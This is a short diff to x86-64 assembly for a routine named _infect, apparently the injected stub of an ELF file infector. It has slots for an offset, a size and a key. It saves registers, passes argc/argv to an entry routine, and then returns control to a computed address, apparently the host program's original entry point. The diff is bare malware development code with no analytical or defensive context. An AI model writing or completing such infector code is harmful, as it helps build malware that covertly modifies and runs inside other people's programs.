@@ -24,8 +24,8 @@ _infect:
 	push r13
 	push r15
 	pushf
+	jmp begin
 
-jmp begin
 diff: db `00000000`
 memaddr: db `00000000`
 size: db `00000000`
@@ -34,6 +34,7 @@ text_length: db `00000000`
 key: db `0000000000000000`
 
 begin:
+
 	mov r14, QWORD[rel diff]
 	lea rax, [rel _infect]
 	sub rax, r14
@@ -45,6 +46,10 @@ begin:
 	mov r13, rax
 	mov QWORD[rel text_start], r13
 
+	;rdi ->argc, rsi -> argv
+	mov rdi, rsi
+	mov rsi, rsp
+	add rsi, 8
 	call entry
 
 	popf
@@ -64,4 +69,6 @@ begin:
 	pop rbx
 	pop rax
 
-	jmp r14
+	push r14
+	mov r14, 0
+	ret
